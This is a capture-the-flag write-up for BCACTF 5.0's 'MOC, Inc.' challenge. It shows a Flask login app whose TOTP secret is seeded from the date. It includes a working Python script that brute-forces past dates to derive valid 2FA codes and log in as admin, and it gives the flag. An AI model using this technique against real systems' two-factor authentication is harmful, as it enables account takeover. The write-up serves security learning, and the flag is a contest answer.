# CTF Competition: BCACTF 5.0

### CTF Name: MOC, Inc.
**CTF Weight:** 100 points ~ 78 solves

![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/c6e6913b-5322-47c5-b0c1-262732fb63ee)


## Writeup:
This challenge requires us to login to the website to get the flag. They have provided us with the username and password or `admin` so all we need to do is find the TOTP (Time-base one time password). Fortunately, they provided the source code `app.py`.

```
from flask import Flask, request, render_template

import datetime
import sqlite3
import random
import pyotp
import sys

random.seed(datetime.datetime.today().strftime('%Y-%m-%d'))

app = Flask(__name__)

@app.get('/')
def index():
    return render_template('index.html')

@app.post('/')
def log_in():
    with sqlite3.connect('moc-inc.db') as db:
        result = db.cursor().execute(
            'SELECT totp_secret FROM user WHERE username = ? AND password = ?',
            (request.form['username'], request.form['password'])
        ).fetchone()

    if result == None:
        return render_template('portal.html', message='Invalid username/password.')

    totp = pyotp.TOTP(result[0])

    if totp.verify(request.form['totp']):
        with open('../flag.txt') as file:
            return render_template('portal.html', message=file.read())

    return render_template('portal.html', message='2FA code is incorrect.')

with sqlite3.connect('moc-inc.db') as db:
    db.cursor().execute('''CREATE TABLE IF NOT EXISTS user (
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        totp_secret TEXT NOT NULL
    )''')
    db.commit()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

        totp_secret = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])

        with sqlite3.connect('moc-inc.db') as db:
            db.cursor().execute('''INSERT INTO user (
                username,
                password,
                totp_secret
            ) VALUES (?, ?, ?)''', (sys.argv[1], sys.argv[2], totp_secret))
            db.commit()

        print('Created user:')
        print('  Username:\t' + sys.argv[1])
        print('  Password:\t' + sys.argv[2])
        print('  TOTP Secret:\t' + totp_secret)

        exit(0)

    app.run()
```


The vulnerability here lies in the seed used to generate the TOTP tokens. The developer based it off of the current time...

```
random.seed(datetime.datetime.today().strftime('%Y-%m-%d'))
```


```
SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

totp_secret = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])
```

This is scary because using time alone to generate the seed is "replayable" as it isn't random at all. I can very easily write a script to get me all the previous days and calculate the TOTP values.

```
import datetime
import random
import requests
import pyotp

URL = "http://challs.bcactf.com:31772/"
SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

start_date = datetime.datetime.today() - datetime.timedelta(days=30)

for day_offset in range(31):
    current_date = start_date + datetime.timedelta(days=day_offset)
    current_date_str = current_date.strftime('%Y-%m-%d')

    random.seed(current_date_str)
    totp_secret = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])

    totp = pyotp.TOTP(totp_secret)

    totp_code = totp.now()

    print(f"Date: {current_date_str}, TOTP Secret: {totp_secret}, Code: {totp_code}")

    # Send the POST request with the TOTP code
    payload = {
        'username': 'admin',
        'password': 'admin',
        'totp': totp_code
    }

    response = requests.post(URL, data=payload)
    if "ctf" in response.text:
        print(response.text)
        break
```


![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/a3974690-bf01-4802-8489-eeca664b3793)

The flag is `bcactf{rNg_noT_r4Nd0m_3n0uGH_a248dc91}`
